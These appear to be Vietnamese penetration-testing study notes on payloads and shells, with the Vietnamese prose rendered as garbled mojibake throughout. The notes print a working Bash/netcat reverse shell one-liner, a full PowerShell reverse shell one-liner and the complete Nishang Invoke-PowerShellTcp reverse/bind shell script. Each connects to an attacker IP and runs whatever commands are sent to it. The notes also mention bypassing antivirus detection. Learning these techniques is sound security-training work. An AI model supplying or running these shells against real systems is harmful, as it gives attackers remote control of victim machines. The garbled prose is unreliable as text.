Payloads & Shells
‚îÇ
‚îú‚îÄ‚îÄ Kh√°i ni·ªám
‚îÇ   ‚îú‚îÄ‚îÄ Payload = m√£ khai th√°c
‚îÇ   ‚îî‚îÄ‚îÄ Shell = m√¥i tr∆∞·ªùng ƒëi·ªÅu khi·ªÉn
‚îÇ
‚îú‚îÄ‚îÄ One-liners
‚îÇ   ‚îú‚îÄ‚îÄ Bash/Netcat reverse
‚îÇ   ‚îî‚îÄ‚îÄ PowerShell reverse
‚îÇ
‚îú‚îÄ‚îÄ Script Payloads
‚îÇ   ‚îî‚îÄ‚îÄ Nishang Invoke-PowerShellTcp
‚îÇ
‚îú‚îÄ‚îÄ ƒê·∫∑c ƒëi·ªÉm
‚îÇ   ‚îú‚îÄ‚îÄ OS-specific
‚îÇ   ‚îú‚îÄ‚îÄ H√¨nh th·ª©c: 1 d√≤ng / script / auto
‚îÇ   ‚îî‚îÄ‚îÄ Tr√°nh AV detection
‚îÇ
‚îî‚îÄ‚îÄ C√¥ng c·ª•
    ‚îú‚îÄ‚îÄ Metasploit
    ‚îú‚îÄ‚îÄ MSFvenom
    ‚îî‚îÄ‚îÄ Netcat / Powercat




1. Kh√°i ni·ªám c∆° b·∫£n
  Payload: trong b·∫£o m·∫≠t, l√† ƒëo·∫°n l·ªánh ho·∫∑c m√£ khai th√°c l·ªó h·ªïng c·ªßa HƒêH / ·ª©ng d·ª•ng.
    ‚Üí Ch√≠nh l√† ph·∫ßn ‚Äúth·ª±c hi·ªán h√†nh ƒë·ªông ƒë·ªôc h·∫°i‚Äù.
  Shell: m√¥i tr∆∞·ªùng cho ph√©p t∆∞∆°ng t√°c v·ªõi h·ªá th·ªëng (qua reverse shell, bind shell, web shell‚Ä¶).
  Payloads th∆∞·ªùng ƒë∆∞·ª£c AV/EDR ch·∫∑n v√¨ ch√∫ng ch·ª©a l·ªánh nguy hi·ªÉm. Hi·ªÉu r√µ c√°ch ho·∫°t ƒë·ªông gi√∫p ta bypass ƒë∆∞·ª£c.

2. V√≠ d·ª• Payload One-liner
  üîπ Netcat/Bash Reverse Shell
      rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
        Gi·∫£i th√≠ch 
            rm -f /tmp/f: x√≥a file n·∫øu c√≥.
            mkfifo /tmp/f: t·∫°o FIFO named pipe.
            cat /tmp/f |: ƒë·ªçc t·ª´ pipe chuy·ªÉn sang input c·ªßa l·ªánh ti·∫øp theo.
            /bin/bash -i 2>&1 |: ch·∫°y shell t∆∞∆°ng t√°c, redirect c·∫£ stdout & stderr.
            nc 10.10.14.12 7777 > /tmp/f: k·∫øt n·ªëi t·ªõi attacker, g·ª≠i shell ra ngo√†i.
  üëâ K·∫øt qu·∫£: m·ªü reverse shell t·ª´ victim v·ªÅ attacker.

  üîπ PowerShell Reverse Shell
    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);
    $stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};
    while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
    $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);
    $sendback = (iex $data 2>&1 | Out-String);
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
      Gi·∫£i th√≠ch 
        -nop -c: ch·∫°y kh√¥ng load profile, th·ª±c thi command.
        TCPClient: m·ªü k·∫øt n·ªëi TCP t·ªõi attacker.
        GetStream(): t·∫°o stream d·ªØ li·ªáu.
        whi le loop: ƒë·ªçc d·ªØ li·ªáu t·ª´ attacker.
        Invoke-Expression (iex): ch·∫°y l·ªánh attacker g·ª≠i t·ªõi.
        Tr·∫£ k·∫øt qu·∫£: g·ª≠i ng∆∞·ª£c output v·ªÅ qua TCP.
üëâ Cho ph√©p attacker c√≥ PowerShell interactive shell tr√™n victim.

3. Script Payloads (v√≠ d·ª• Nishang ‚Äì Invoke-PowerShellTcp)
    H·ªó tr·ª£ Reverse ho·∫∑c Bind shell.
    C√≥ th·ªÉ d√πng c·∫£ IPv4 & IPv6.
    Cho ph√©p attacker:
      K·∫øt n·ªëi v√†o victim (bind).
      Victim ch·ªß ƒë·ªông k·∫øt n·ªëi ra ngo√†i (reverse).

4. ƒê·∫∑c ƒëi·ªÉm Payloads
    H√¨nh th·ª©c ƒëa d·∫°ng:
      One-liner (d·ªÖ copy-paste).
      Script (.ps1, .sh).
      Auto-generated (MSFvenom, Metasploit).
    T√πy OS / shell / ng√¥n ng·ªØ tr√™n target ‚Üí ch·ªçn payload ph√π h·ª£p.
    M·ª•c ti√™u cu·ªëi: c√≥ ƒë∆∞·ª£c shell ƒëi·ªÅu khi·ªÉn h·ªá th·ªëng.

5. C√¥ng c·ª• h·ªó tr·ª£
  Metasploit Framework: t·∫°o payload, listener, exploit t·ª± ƒë·ªông.
  MSFvenom: crafting payload.
  Netcat / Powercat: l·∫Øng nghe k·∫øt n·ªëi ho·∫∑c g·ª≠i payload.




=================================================== M√£ ƒë·ªôc c·ªßa Nishang ===================================================

function Invoke-PowerShellTcp 
{ 
<#
.SYNOPSIS
Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
.DESCRIPTION
This script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. 
Also, a standard Netcat can connect to this script Bind to a specific port.
The script is derived from Powerfun written by Ben Turner & Dave Hardy
.PARAMETER IPAddress
The IP address to connect to when using the -Reverse switch.
.PARAMETER Port
The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
the given IP and port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Bind -Port 4444
Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
listening on the given IP and port. 
.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
https://github.com/nettitude/powershell/blob/master/powerfun.ps1
https://github.com/samratashok/nishang
#>      
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,

        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,

        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind

    )

    
    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        #Bind to the provided port if Bind switch is used.
        if ($Bind)
        {
            $listener = [System.Net.Sockets.TcpListener]$Port
            $listener.start()    
            $client = $listener.AcceptTcpClient()
        } 

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}


=================================================== K·∫øt th√∫c M√£ ƒë·ªôc c·ªßa Nishang ===================================================







